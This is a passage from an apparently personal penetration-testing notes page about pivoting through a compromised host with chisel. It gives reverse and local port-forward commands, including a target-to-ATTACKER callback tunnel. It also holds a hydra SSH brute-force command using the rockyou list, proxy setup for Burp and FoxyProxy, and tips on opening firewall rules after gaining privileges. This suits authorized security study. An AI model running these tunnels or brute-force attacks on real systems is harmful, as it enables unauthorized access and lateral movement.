R:1337:172.18.0.1:8080</em></p><p></p><p><span class="subheading">Forwarding SSH</span>: This should forward traffic from Attacker&#39;s localhost:1337 to target&#39;s localhost:22</p><p></p><p><strong>{Attacker} </strong><em>./chisel</em> <em>server -p 8888 --reverse -v</em></p><p></p><p><strong>{Target}</strong><em> ./chisel_static client ATTACKER:8888 R:1337:</em>localhost:22</p><p></p><p><em>hydra -l fox -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -f -t 4 -s 1337 -V localhost ssh</em></p><p></p><p><h3>Local Port Forward</h3></p><p>This has the same downsides as a Forward Proxy.</p><p></p><p>If the Target Server is 172.18.0.5 &amp; the destination is 172.18.0.1:8080, run the following.</p><p></p><p><strong>{Target}</strong><em> ./chisel_static</em> <em>server -p 8888</em></p><p></p><p><strong>{Attacker} </strong><em>./chisel</em> <em>client 172.18.0.5:8888:172.18.0.1:8080</em></p><p></p><p><h2>Troubleshooting</h2><h2></h2></p><p><h2></h2><h3>Using Same Version</h3></p><p>Even though the static &amp; regularly compiled version of chisel should be the same version, &amp; may work intermittently, it&#39;s more reliable to use the same compiled binary for client &amp; server.</p><p></p><p><h3>Kill &amp; Restart</h3></p><p>If you&#39;re having issues try killing the server (&amp; maybe the client too), &amp; then try connecting again.</p><p><h2></h2></p><p><h2>Increasing Security</h2></p><p>IRL when security is a concern, there are several settings which can better protect your tunnel.</p><p></p><p>Some examples include specify credentials for authenticating, generating Keys or TLS Certs, etc.</p><p></p><p><strong>--fingerprint</strong>: Specify the server&#39;s fingerprint to protect against MitM</p><p></p><p><a name="Connecting to Proxy"></a><h1>Connecting to Proxy</h1></p><p><h2>FoxyProxy</h2></p><p>Ensure that connection is setup to use SOCKS, &amp; not HTTP(s)</p><p></p><p><h2>Proxychains</h2></p><p><h2>Burpsuite</h2></p><p><strong>Proxy </strong>→<strong> Proxy Settings </strong>↓ <strong>Network </strong>↓<strong>Connections </strong>↓<strong> SOCKS proxy</strong></p><p></p><p>For Chisel, set Host to 127.0.0.1 &amp; Port to 1080</p><p></p><p>You can now use the built-in browser, or FoxyProxy to use the Proxy.</p><p></p><p><h1>Tips</h1><ul><li>If you&#39;ve sufficient privs (e.g root / SYSTEM), can create FW rule to let Attacker&#39;s traffic in.</li></ul></p><p><ul><li>Linux target may&#39;ve iptables &amp; ufw, &amp; just creating an iptables rule may not be sufficient.</li></ul></p><p><ul><li>Some <span style="color:#ff0000;">SVCs</span> <span style="color:#ff0000;">may only be accessible</span> when using a <span style="color:#ff0000;">specific interface</span> (e.g can only RDP via internal IP 10.x &amp; not the external IP 192.x)</li></ul></p></div>
</body>
</html>
